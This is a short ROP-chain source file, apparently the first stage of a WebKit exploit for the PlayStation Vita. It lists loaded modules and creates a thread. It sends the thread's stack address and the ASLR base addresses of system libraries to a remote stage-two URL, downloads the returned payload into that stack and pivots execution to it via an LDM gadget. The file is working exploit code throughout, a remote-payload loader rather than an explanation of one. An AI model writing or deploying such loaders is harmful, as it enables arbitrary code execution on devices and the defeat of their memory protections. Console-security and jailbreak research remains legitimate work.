#include "common.rop"

data
{
	#include "functions.rop"

	symbol stack_size = 6 * 1024 * 1024;
	symbol SCE_SYSMODULE_NGS = 0xB;

	variable thread_id = -1;
	variable http_uid = -1;
	variable stack_base = -1; // second thread will pivot here
	variable num_loaded = -1;
	buffer thread_info[0x80];
	buffer download_url[0x200];
	buffer tmp[0x100];
	buffer ldm_buf[7 * 4];
	buffer module_list[0x100];
	buffer module_info[440];

	#include "../build/config.rop"
}

code : entry
{
	store(64, num_loaded);
	sceKernelGetModuleList(0xFF, module_list, num_loaded);
	PRINTF("loaded %x\n", [num_loaded]);
	store(440, module_info);
	sceKernelGetModuleInfo([module_list+4*21], module_info);

	sceKernelCreateThread("st2", ldm_r1_stuff, 0x10000100, stack_size, 0, 0, 0);
	store(&return, thread_id);
	PRINTF("thread %x \n", &return);
	store(0x7C, thread_info);
	sceKernelGetThreadInfo([thread_id], thread_info);
	PRINTF("stack %x  \n", [thread_info + 0x34]);
	// some free space for function calls
	add([thread_info + 0x34], 0x1000);
	store(&return, stack_base);

	strcat(download_url, stage2_url_base);
	snprintf(tmp, 256, "?a1=%x", [stack_base]);
	strcat(download_url, tmp);
	snprintf(tmp, 256, "&a2=%x&a3=%x&a4=%x&", ASLR::SceWebKit+0, ASLR::SceLibKernel+0, ASLR::SceLibc+0);
	strcat(download_url, tmp);
	snprintf(tmp, 256, "&a5=%x&a6=%x&a7=%x&", ASLR::SceLibHttp+0, ASLR::SceNet+0, ASLR::SceAppMgr+0);
	strcat(download_url, tmp);
	PRINTF("%s\n", download_url);

	sceHttpInit(0x10000);
	sceHttpCreateTemplate("ldr", 2, 1);
	sceHttpCreateConnectionWithURL(&return, download_url, 0);
	sceHttpCreateRequestWithURL(&return, 0, download_url, 0, 0, 0);
	store(&return, http_uid);
	sceHttpSendRequest([http_uid], 0, 0);
	sceHttpReadData([http_uid], [stack_base], stack_size);

	// prepare args for LDM gadget
	store([stack_base], ldm_buf+5*4);
	store(pop_pc, ldm_buf+6*4);

	// start second thread
	sceKernelStartThread([thread_id], 7 * 4, ldm_buf);

	sceKernelWaitThreadEnd([thread_id], 0, 0);
}
